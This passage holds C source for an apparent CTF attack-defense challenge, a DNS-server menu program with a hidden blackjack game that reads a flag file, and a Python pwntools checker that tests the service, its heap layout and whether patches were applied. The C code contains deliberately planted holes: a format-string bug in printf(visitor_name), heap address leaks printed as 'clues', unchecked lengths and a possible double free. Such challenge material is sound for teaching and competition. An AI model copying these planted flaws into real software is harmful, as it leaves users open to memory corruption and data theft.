&amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. Prints menu. &#123; // system("clear"); asktitle(); &#125; // End if loop else if((choice1 == 'N') || (choice1 == 'n')) // If no, convinces user to enter yes &#123; // system("clear"); printf("\n I told you so.\n"); asktitle(); &#125; return;&#125; // End function int clubcard() //Displays Club Card Image&#123; //srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| %d |\n", k); printf("| %c|\n", club); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| J |\n"); printf("| %c|\n", club); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| A |\n"); printf("| %c|\n", club); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| Q |\n"); printf("| %c|\n", club); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Club Card printf("-------\n"); printf("|%c |\n", club); printf("| K |\n"); printf("| %c|\n", club); printf("-------\n"); k=10; //Set card value to 10 &#125; return k; &#125;// End function int diamondcard() //Displays Diamond Card Image&#123; //srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| %d |\n", k); printf("| %c|\n", diamond); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| J |\n"); printf("| %c|\n", diamond); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| A |\n"); printf("| %c|\n", diamond); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| Q |\n"); printf("| %c|\n", diamond); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Diamond Card printf("-------\n"); printf("|%c |\n", diamond); printf("| K |\n"); printf("| %c|\n", diamond); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125;// End function int heartcard() //Displays Heart Card Image&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| %d |\n", k); printf("| %c|\n", heart); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| J |\n"); printf("| %c|\n", heart); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| A |\n"); printf("| %c|\n", heart); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| Q |\n"); printf("| %c|\n", heart); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Heart Card printf("-------\n"); printf("|%c |\n", heart); printf("| K |\n"); printf("| %c|\n", heart); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125; // End Function int spadecard() //Displays Spade Card Image&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function k=rand()%13+1; if(k&lt;=9) //If random number is 9 or less, print card with that number &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| %d |\n", k); printf("| %c|\n", spade); printf("-------\n"); &#125; if(k==10) //If random number is 10, print card with J (Jack) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| J |\n"); printf("| %c|\n", spade); printf("-------\n"); &#125; if(k==11) //If random number is 11, print card with A (Ace) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| A |\n"); printf("| %c|\n", spade); printf("-------\n"); if(player_total&lt;=10) //If random number is Ace, change value to 11 or 1 depending on dealer total &#123; k=11; &#125; else &#123; k=1; &#125; &#125; if(k==12) //If random number is 12, print card with Q (Queen) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| Q |\n"); printf("| %c|\n", spade); printf("-------\n"); k=10; //Set card value to 10 &#125; if(k==13) //If random number is 13, print card with K (King) on face &#123; //Spade Card printf("-------\n"); printf("|%c |\n", spade); printf("| K |\n"); printf("| %c|\n", spade); printf("-------\n"); k=10; //Set card value to 10 &#125; return k;&#125; // End Function int randcard() //Generates random card&#123; // srand((unsigned) time(NULL)); //Generates random seed for rand() function random_card = rand()%4+1; if(random_card==1) &#123; clubcard(); l=k; &#125; if(random_card==2) &#123; diamondcard(); l=k; &#125; if(random_card==3) &#123; heartcard(); l=k; &#125; if(random_card==4) &#123; spadecard(); l=k; &#125; return l;&#125; // End Function void play() //Plays game&#123; int p=0; // holds value of player_total int i=1; // counter for asking user to hold or stay (aka game turns) char choice3; player_total=0; dealer_total=0; cash = cash; cash_test(); printf("\nCash: $%d\n",cash); //Prints amount of cash user has randcard(); //Generates random card player_total = p + l; //Computes player total p = player_total; printf("\nYour Total is %d\n", p); //Prints player total dealer(); //Computes and prints dealer total betting(); //Prompts user to enter bet amount while(i&lt;=21) //While loop used to keep asking user to hit or stay at most twenty-one times // because there is a chance user can generate twenty-one consecutive 1's &#123; if(p==21) //If user total is 21, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(p&gt;21) //If player total is over 21, loss &#123; printf("\nWoah Buddy, You Went WAY over.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(p&lt;=21) //If player total is less than 21, ask to hit or stay &#123; printf("\n\nWould You Like to Hit or Stay?"); scanf("%c", &amp;choice3); while((choice3!='H') &amp;&amp; (choice3!='h') &amp;&amp; (choice3!='S') &amp;&amp; (choice3!='s')) // If invalid choice entered &#123; printf("\n"); printf("Please Enter H to Hit or S to Stay.\n"); scanf("%c",&amp;choice3); &#125; if((choice3=='H') || (choice3=='h')) // If Hit, continues &#123; randcard(); player_total = p + l; p = player_total; printf("\nYour Total is %d\n", p); dealer(); if(dealer_total==21) //Is dealer total is 21, loss &#123; printf("\nDealer Has the Better Hand. You Lose.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(dealer_total&gt;21) //If dealer total is over 21, win &#123; printf("\nDealer Has Went Over!. You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; &#125; if((choice3=='S') || (choice3=='s')) // If Stay, does not continue &#123; printf("\nYou Have Chosen to Stay at %d. Wise Decision!\n", player_total); stay(); &#125; &#125; i++; //While player total and dealer total are less than 21, re-do while loop &#125; // End While Loop&#125; // End Function void dealer() //Function to play for dealer AI&#123; int z; if(dealer_total&lt;17) &#123; // srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function z=rand()%13+1; if(z&lt;=10) //If random number generated is 10 or less, keep that value &#123; d=z; &#125; if(z&gt;11) //If random number generated is more than 11, change value to 10 &#123; d=10; &#125; if(z==11) //If random number is 11(Ace), change value to 11 or 1 depending on dealer total &#123; if(dealer_total&lt;=10) &#123; d=11; &#125; else &#123; d=1; &#125; &#125; dealer_total = dealer_total + d; &#125; printf("\nThe Dealer Has a Total of %d", dealer_total); //Prints dealer total &#125; // End Function void stay() //Function for when user selects 'Stay'&#123; dealer(); //If stay selected, dealer continues going if(dealer_total&gt;=17) &#123; if(player_total&gt;=dealer_total) //If player's total is more than dealer's total, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(dealer_total&gt;21) //If dealer's total is more than 21, win &#123; printf("\nUnbelievable! You Win!\n"); won = won+1; cash = cash+bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; if(player_total&lt;dealer_total) //If player's total is less than dealer's total, loss &#123; printf("\nDealer Has the Better Hand. You Lose.\n"); loss = loss+1; cash = cash - bet; printf("\nYou have %d Wins and %d Losses. Awesome!\n", won, loss); dealer_total=0; askover(); &#125; &#125; else &#123; stay(); &#125; &#125; // End Function void cash_test() //Test for if user has cash remaining in purse&#123; if (cash &lt;= 0) //Once user has zero remaining cash, game ends and prompts user to play again &#123; printf("You Are Bankrupt. Game Over"); //cash = 500; exit(0); //askover(); &#125; if(cash&gt;=WIN_SUM)&#123; int id; int length; char buffer[100]; char *key=0; id = open("/home/tsctf/flag/flag",O_RDONLY,S_IRUSR ); if(id &lt;0)&#123; printf("flag file error~!\n"); exit(0); &#125; length = read(id,buffer,100); if (length&lt;0)&#123; printf("read error~!\n"); exit(0); &#125; buffer[length] = '\0'; length = strlen(buffer); key = malloc(length); for(int i =0 ; i&lt;length;i++)&#123; //printf("%d ",key[i*4]); key[i]=(rand()%256); &#125; //printf("%d",(length/4)*4); for(int i = 0;i&lt;length;i++)&#123; //printf("%2x",key[i]); buffer[i] = buffer[i]^key[i]; &#125; puts("d(`･∀･)b :"); puts(" OK, you win,"); puts("I won't give u real flag :"); write(1,buffer,length); close(id); exit(0); &#125;&#125; // End Function int betting() //Asks user amount to bet&#123; printf("\n\nEnter Bet: $"); scanf("%u", &amp;bet); while ((bet &gt; cash) || (bet == 0))//If player tries to bet more money than player has &#123; printf("\nAre you kidding me? "); printf("\nEnter Bet: "); scanf("%u", &amp;bet); //return bet; &#125;return bet;&#125; // End Function void askover() // Function for asking player if they want to play again&#123; char choice1; printf("\nWould You Like To Play Again?"); printf("\nPlease Enter Y for Yes or N for No\n"); scanf("\n%c",&amp;choice1); while((choice1!='Y') &amp;&amp; (choice1!='y') &amp;&amp; (choice1!='N') &amp;&amp; (choice1!='n')) // If invalid choice entered &#123; printf("\n"); printf("Incorrect Choice. Please Enter Y for Yes or N for No.\n"); scanf("%c",&amp;choice1); &#125; if((choice1 == 'Y') || (choice1 == 'y')) // If yes, continue. &#123; // system("clear"); play(); &#125; else if((choice1 == 'N') || (choice1 == 'n')) // If no, exit program &#123; //fileresults(); printf("\nBYE!!!!\n\n"); //system("pause"); exit(0); &#125; return;&#125; // End function void fileresults() //Prints results into Blackjack.txt file in program directory&#123; FILE *fpresults; //File pointer is fpresults fpresults = fopen(RESULTS, "w"); //Creates file and writes into it if(fpresults == NULL) // what to do if file missing from directory &#123; printf("\nError: File Missing\n"); //system("pause"); exit(1); &#125; else &#123; fprintf(fpresults,"\n\t RESULTS"); fprintf(fpresults,"\n\t---------\n"); fprintf(fpresults,"\nYou Have Won %d Times\n", won); fprintf(fpresults,"\nYou Have Lost %d Times\n", loss); fprintf(fpresults,"\nKeep Playing and Set an All-Time Record!"); &#125; fclose(fpresults); return;&#125; // End Functionvoid handler()&#123; puts("[-] Time out ... \n"); exit(1);&#125;void init() &#123; char *logo = "*******************************************\n" "* _____ _____ _____ _____ _____ *\n" "* |_ _| / ___/ / ___| |_ _| | ___| *\n" "* | | | |___ | | | | | |__ *\n" "* | | \\___ \\ | | | | | __| *\n" "* | | ___| | | |___ | | | | *\n" "* |_| /_____/ \\_____| |_| |_| *\n" "* *\n" "* ------ Welcome to TSCTF FINAL --------- *\n" "* ------ Have a nice day --------- *\n" "* _____ _ __ _ ___ _ *\n" "* | ___| | | | \\ | | / | | | *\n" "* | |__ | | | \\| | / /| | | | *\n" "* | __| | | | |\\ | / / | | | | *\n" "* | | | | | | \\ | / / | | | |___ *\n" "* |_| |_| |_| \\_| /_/ |_| |_____| *\n" "*******************************************\n" "\n"; puts(logo); setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); setvbuf(stderr,0,2,0); signal(14,handler); alarm(200); srand((unsigned) time(NULL)/60); visitor_name = malloc(8); strcpy(visitor_name,"anonym");&#125;void menu()&#123; puts("==GOD.ZE DNS Server=="); puts("1. Login"); puts("2. Add a DNS item"); puts("3. Parsing domain names "); puts("4. Delete DNS item"); puts("5. Exit"); puts("=====================");&#125;void menu1()&#123; puts("=====MENU======"); puts("1. set name"); puts("2. set motto"); puts("3. show motto"); puts("4. Exit"); puts("===============");&#125;void maybe_real_set_name()&#123; scanf("%7s",visitor_name); puts("OK, I know your name :"); printf(visitor_name);&#125;void set_name()&#123; maybe_real_set_name();&#125;void set_motto()&#123; char buffer[0x200] ; read_n(buffer,0x200); motto = strdup(buffer);&#125;int login()&#123; if (login_flag != 0) return -1; char * fmt = "%d"; int opt; while(1)&#123; printf("&gt;"); if(scanf(fmt,&amp;opt)&lt;=0)&#123; exit(0); &#125; switch(opt)&#123; case 1: if((login_flag &amp; 0x01)==0)&#123; login_flag = login_flag|0x01; printf("name:"); set_name(); &#125; break; case 2: if((login_flag &amp;0x10) == 0)&#123; login_flag = login_flag|0x10; printf("motto:"); set_motto(); &#125; break; case 3: if((login_flag &amp;0x100) == 0)&#123; login_flag = login_flag|0x100; if(motto!=0) puts(motto); &#125; break; case 4: return 0; break; default: puts("invalid options\n"); &#125; &#125;&#125;int read_n(char *src,int len)&#123; unsigned int i; for ( i = 0; i &lt; len; i++ ) &#123; if ( read(0, (void *)(i + src), 1) != 1 ) exit(-1); if ( *(src+i) == 10 ) &#123; *(src+i) = 0; return i; &#125; &#125; return i; &#125;int read_int()&#123; char nptr[16]; read_n(nptr, 0xA); return (unsigned int)atoi(nptr);&#125;int check_format(char *ip)&#123; int num =0; for(int i=0;i&lt;0x20;i++)&#123; if(ip[i]=='.')&#123; num += 1; &#125; &#125; if(num!=3)&#123; return -1; &#125; return 0;&#125;void add_DNS()&#123; struct DNS_Node * tmp; unsigned int len,i; char *remark; for ( i = 0; i &lt;= 31 &amp;&amp; DNS_Node_List[i]; ++i ) ; if ( i == 32 ) return 0xFFFFFFFFLL; tmp = malloc(sizeof(struct DNS_Node)); printf("ψ(｀∇´)ψ: Let me leave some clue [%03x]\n",((unsigned int)tmp&amp;0xfff)); strcpy(tmp-&gt;user,visitor_name); printf("input domain: "); read_n(tmp-&gt;domain,0x30); printf("input length:"); len =read_int(); remark = malloc(len+0x20); printf("ψ(｀∇´)ψ: Let me leave some clue [%03x]\n",((unsigned)remark&amp;0xfff)); tmp-&gt;ptr = remark; printf("input remark:"); read_n(remark+0x20,len); printf("input IP:"); read_n(remark,0x20); if(check_format(remark)!=0)&#123; printf("error input,bye!\n"); exit(0); &#125; DNS_Node_List[i]=tmp; printf("Complete\n");&#125;void parse_domain()&#123; char domain[0x30]; struct DNS_Node *tmp=0; int i; printf("Give me ur domain:"); read_n(domain,0x30); for ( i = 0; i &lt;= 31; ++i ) &#123; if ( DNS_Node_List[i] &amp;&amp; !strcmp(domain, DNS_Node_List[i]-&gt;domain) ) &#123; tmp = DNS_Node_List[i]; printf("adder : %s\n",tmp-&gt;user ); printf("IP : %s\n",tmp-&gt;ptr ); printf("remark: %s\n",(tmp-&gt;ptr + 0x20)); printf("---------------------------\n"); &#125; &#125; if ( !tmp ) puts("not find!!"); &#125;void delete_DNS()&#123; char domain[0x30]; struct DNS_Node *tmp; int i,zero,j; printf("Give me bad domain:"); read_n(domain,0x30); zero = 0; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( DNS_Node_List[i] &amp;&amp; !strcmp(domain, DNS_Node_List[i]-&gt;domain) &amp;&amp; !strcmp(visitor_name,DNS_Node_List[i]-&gt;user) ) &#123; zero = 1; tmp = DNS_Node_List[i]; j=i; free(tmp-&gt;ptr); free(tmp); &#125; &#125; if(zero)&#123; DNS_Node_List[j]=0; printf("complete\n" ); &#125; else&#123; puts("not find!!"); &#125;&#125;void main()&#123; asm( "shr $0x16,%rsp\n" "shl $0x16,%rsp\n" "xor $0x188,%rsp\n" "push %rbp\n" "mov %rsp,%rbp\n" "sub $0x20,%rsp\n" ); int option; init(); //menu(); while(1)&#123; menu(); printf("&gt;"); if(scanf("%u",&amp;option)&lt;=0)&#123; exit(0); &#125; switch(option)&#123; case 1: menu1(); login(); break; case 2: add_DNS(); break; case 3: parse_domain(); break; case 4: delete_DNS(); break; case 5: puts("=͟͟͞͞ =͟͟͞͞ ﾍ( ´Д`)ﾉ :"); puts(" [Don't leave me alone, I can give u sh311 !]"); puts(" "); exit(0); break; case 0xbabe: game(); break; &#125; //login(); //game(); &#125;&#125;/*NODE -&gt; USER(8) + DOMAIN(0X30) +PTR(8)CONTENT -&gt; DNS(0X20) + CONTENT(~)*/c Checker123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609#!/usr/bin/env python# coding=utf-8from pwn import *import randomimport threadimport stringimport hashlibimport requestsimport osfrom termcolor import *import jsonimport timecoding_check_level = 1fmt_check_level = 0log_file = 'note_check'debug = 0check = Falsefile_path = '/home/tsctf/binary/pwn'#/Desktop/DNS_Server'if debug: round_time = 300 slog = 1else: round_time = 300 slog = 0class TimeoutError(Exception): def __init__(self, err='timeout'): Exception.__init__(self, err)class ResponseError(Exception): def __init__(self, err='ErrResponse'): Exception.__init__(self, err)class Checker: """ function checker for Question Note """ def __init__(self, _rhost, _port, _timeout): # pwntools init global context global slog context.log_level = 'ERROR' if slog: context.log_level = 'DEBUG' if _timeout: context.timeout = _timeout # check result init self.state = 0 # local variables init self.rhost = remote(_rhost, _port) self.name = '' self.oip = _rhost self.oport = _port def randstr(self, length=10): # generate random string with lowercase result = '' space = string.lowercase for i in range(length): index = random.randint(0, len(space) - 1) result += space[index] return result def md5(self, inputstr): return hashlib.md5(inputstr).hexdigest() def check_login(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline("1") self.rhost.recvuntil("===============\n&gt;") self.rhost.sendline("1") self.rhost.recvuntil("name:") name = self.randstr(7) self.rhost.sendline(name) self.rhost.recvuntil('OK, I know your name :\n') recv = self.rhost.recvuntil("&gt;") if name not in recv: print_log(colored('[Error] in login_set_name : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError if ((name+'\n') in recv)&amp;(fmt_check_level!=0): print_log(colored('[Error] bad patch format vul : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.sendline('2') self.rhost.recvuntil('motto:') motto = self.randstr(0x200) self.rhost.send(motto) self.rhost.recvuntil('&gt;') self.rhost.sendline('3') if motto not in self.rhost.recvuntil("&gt;"): print_log(colored('[Error] in login_show_motto : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError def add(self,domain,length,remark,ip): self.rhost.recvuntil('&gt;') self.rhost.sendline('2') self.rhost.recvuntil("domain:") #domain_2 = self.randstr(0x30) self.rhost.sendline(domain) self.rhost.recvuntil("length:") self.rhost.sendline(str(length)) self.rhost.recvuntil("remark:") #remark_2 = self.randstr(0x90) self.rhost.sendline(remark) self.rhost.recvuntil("input IP:") self.rhost.sendline(ip) def delete(self,domain): self.rhost.recvuntil('&gt;') self.rhost.sendline('4') self.rhost.recvuntil('domain:') self.rhost.sendline(domain) def parse(self,domain): self.rhost.recvuntil('&gt;') self.rhost.sendline('3') self.rhost.recvuntil('domain:') self.rhost.sendline(domain) def check_DNS(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline("1") self.rhost.recvuntil("===============\n&gt;") self.rhost.sendline("1") self.rhost.recvuntil("name:") name = self.randstr(7) self.rhost.sendline(name) self.rhost.recvuntil('OK, I know your name :\n') self.rhost.recvuntil("&gt;") self.rhost.sendline('4') # add domain_1 = self.randstr(0x30-1) domain_2 = self.randstr(0x30-1) remark_1 = self.randstr(0x50-1) remark_2 = self.randstr(0x90-1) remark_3 = self.randstr(0x110-1) self.add(domain_1,0x50,remark_1,"127.0.0.1") self.add(domain_1,0x90,remark_2,"127.0.0.1") self.add(domain_2,0x110,remark_3,"0.0.0.0") self.parse(domain_1) self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "127.0.0.1" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_1 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "127.0.0.1" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_2 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.parse(domain_2) self.rhost.recvuntil("adder : ") if name not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("IP : ") if "0.0.0.0" not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark: ") if remark_3 not in self.rhost.recvline(): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.delete(domain_2) self.parse(domain_2) if "not find!!" not in self.rhost.recvuntil("==GOD"): print_log(colored('[Error] in parse : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError def get_num(self): self.rhost.recvuntil('Your Total is ') return int(self.rhost.recvline()[:-1]) def get_money(self): self.rhost.recvuntil("Cash: $") return int(self.rhost.recvline()[:-1]) def round(self): self.money = self.get_money() if (self.money!= self.pre_money): print_log(colored('[Error] in game : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("Bet: $") self.rhost.sendline('1') self.rhost.recvuntil('Please Enter H to Hit or S to Stay.') self.rhost.sendline('H') while (1): num = self.get_num() tmp = self.rhost.recv() #print '[+]',tmp,'[-]' if 'Would You Like to Hit or Stay?' in tmp: self.rhost.sendline("H") elif 'Enter Y for Yes or N for No' in tmp: win_num = int(tmp.split(' Wins and ')[0][-1:]) loss_num = int(tmp.split(' Wins and ')[1][:1]) if self.win &lt; win_num: self.win = win_num return 1 if self.loss &lt; loss_num: self.loss = loss_num return -1 else: tmp = self.rhost.recv() #print '[+]',tmp,'[-]' if 'Would You Like to Hit or Stay?' in tmp: self.rhost.sendline("H") elif 'Enter Y for Yes or N for No' in tmp: win_num = int(tmp.split(' Wins and ')[0][-1:]) loss_num = int(tmp.split(' Wins and ')[1][:1]) if self.win &lt; win_num: self.win = win_num return 1 if self.loss &lt; loss_num: self.loss = loss_num return -1 def check_game(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.win = 0 self.loss = 0 self.money = 5 self.pre_money = 5 self.rhost.sendline(str(0xbabe)) self.rhost.recvuntil("(Y/N)") self.rhost.sendline("y") self.rhost.recvuntil("Choice:") self.rhost.sendline("1") for i in range(3): self.pre_money += self.round() self.rhost.sendline('y') def check_heap(self): data = self.rhost.recvuntil('=====================\n&gt;') if not data: print_log(colored('[Error] outoftime : ' + self.oip + '\n', 'red'),ip=self.oip) raise TimeoutError self.rhost.sendline('2') self.rhost.recvuntil("[") addr_1 = int(self.rhost.recvuntil(']')[:-1],16) self.rhost.recvuntil("domain:") self.rhost.sendline("p4nda") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x58)) self.rhost.recvuntil("[") addr_2 = int(self.rhost.recvuntil(']')[:-1],16) if (addr_2-addr_1)!=0x50: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") #test 1 self.rhost.recvuntil("&gt;") self.rhost.sendline('2') self.rhost.recvuntil("[") addr_3 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_3-addr_2)!=0x80: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("domain:") self.rhost.sendline("dubhe") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x110)) self.rhost.recvuntil("[") addr_4 = int(self.rhost.recvuntil(']')[:-1],16) if (addr_4-addr_3)!=0x50: print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") #test 2 self.delete("p4nda") self.rhost.recvuntil("&gt;") self.rhost.sendline('2') self.rhost.recvuntil("[") addr_3 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_3!=addr_1): print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("domain:") self.rhost.sendline("p4nda") self.rhost.recvuntil("length:") self.rhost.sendline(str(0x58)) self.rhost.recvuntil("[") addr_4 = int(self.rhost.recvuntil(']')[:-1],16) if(addr_2!=addr_4): print_log(colored('[Error] in heap : ' + self.oip + '\n', 'red'),ip=self.oip) raise ResponseError self.rhost.recvuntil("remark:") self.rhost.sendline("p4nda") self.rhost.recvuntil("input IP:") self.rhost.sendline("1.1.1.1") def function_check(self): try: self.check_login() self.rhost.close() self.rhost = remote(self.oip, self.oport) self.check_DNS() #self.rhost.close() #self.rhost = remote(self.oip, self.oport) #self.check_game() self.rhost.close() self.rhost = remote(self.oip, self.oport) self.check_heap() self.rhost.close() except Exception as e: print e try: self.rhost.close() except Exception as e: pass self.state = 1 def getResult(self): return self.statedef check(ip, port): """ function: check workstate with single ip :return: check result format &#123;'ip': "127.0.0.1", 'status', 0&#125; 0 stands for normal and 1 stands for down """ try: checker = Checker(ip, port, 10) checker.function_check() return checker.getResult() except Exception as e: if debug: print e if 'invalid literal for int() with base 10:' in e : return 0 return 1def upload(check_server, payload): #print payload r = requests.post(check_server, data=payload) print r.textdef log(filename, str): f = open(filename + ".log", 'ab') f.write(str) f.close()def print_log(info,ip=""): print info log(log_file, info + "\n") if ip!="": if not os.path.exists('./checkresult/'): os.makedirs('./checkresult/') log('./checkresult/'+ip+'.log','['+time.asctime( time.localtime(time.time()) )+'] '+ info + "\n")def CalcMD5(filepath): with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() #print(hash) return hashdef patch_check(file_path,standard,oip): #print "in" f = open(file_path,"rb") f_standard = open(standard,'rb')#main 0x3370 - 0x325a f.seek(0x325a,0) f_standard.seek(0x325a,0) standard_tmp = f_standard.read(0x3370-0x325a) md5obj = hashlib.md5() tmp = f.read(0x3370-0x325a) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in patch main : ' + oip + '\n', 'red'),ip=oip) return 0 # init 0x29D6 0x2AB6 f.seek(0x29D6,0) f_standard.seek(0x29D6,0) standard_tmp = f_standard.read(0x2AB6-0x29D6) 